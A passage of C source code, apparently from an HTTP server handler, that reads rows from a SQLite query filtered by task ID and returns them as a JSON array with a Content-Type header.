            sqlite3_bind_text(ppstmt, 2, task_id_param, -1, free); //frees task param
        }
    }
    else {
        sqlite3_close(db_handle);
        return bad_request(http_response);
    }
    //from here it's an exact duplicate of get_agents
    //should really add a general sql_to_json_array_response function
    //ppstmt is prepared and bound by this point
    json_t *response_root = json_array();
    if (response_root == NULL) {
        fprintf(stderr, "jannson alloc\n");
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        return -1;
    }
    while ((rc = sqlite3_step(ppstmt)) == SQLITE_ROW) {
        json_t *row_obj = json_object();
        if (row_obj == NULL) {
            fprintf(stderr, "jannson alloc\n");
            json_decref(response_root);
            sqlite3_finalize(ppstmt);
            sqlite3_close(db_handle);
            return -1;
        }
        int col_count = sqlite3_column_count(ppstmt);
        for (int i = 0; i < col_count; i++) {
            const char *col_name = sqlite3_column_name(ppstmt, i);
            int col_type = sqlite3_column_type(ppstmt, i);
            switch (col_type) {
                case SQLITE_INTEGER:
                    json_object_set_new(row_obj, col_name,
                                        json_integer(sqlite3_column_int64(ppstmt, i)));
                    break;
                case SQLITE_FLOAT:
                    json_object_set_new(row_obj, col_name,
                                        json_real(sqlite3_column_double(ppstmt, i)));
                    break;
                case SQLITE_TEXT:
                    json_object_set_new(row_obj, col_name,
                                        json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
                case SQLITE_NULL:
                    json_object_set_new(row_obj, col_name, json_null());
                    break;
                default:
                    // Fallback to string
                    json_object_set_new(row_obj, col_name,
                                        json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
            }
        }

        json_array_append_new(response_root, row_obj);
    }
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "error reading rows: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        json_decref(response_root);
        return -1;
    }
    sqlite3_finalize(ppstmt);
    sqlite3_close(db_handle);

    //response_root must be ready
    http_response->stat_line.status_code = 200;
    http_response->stat_line.reason = NULL;
    http_response->content_length = json_dumpb(response_root, NULL, 0, 0);
    if (http_response->content_length == 0) {
        fprintf(stderr, "json dump failed.\n");
        json_decref(response_root);
        return -1;
    }
    http_response->body = malloc(http_response->content_length);
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    http_response->content_length = json_dumpb(response_root, http_response->body,
        http_response->content_length, 0);
    //set headers
    http_response->headers = hash_init_table();
    if (http_response->headers == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("application/json");
    hash_add_node(http_response->headers, content_type);
    //success
    json_decref(response_root);
    return 0;
}
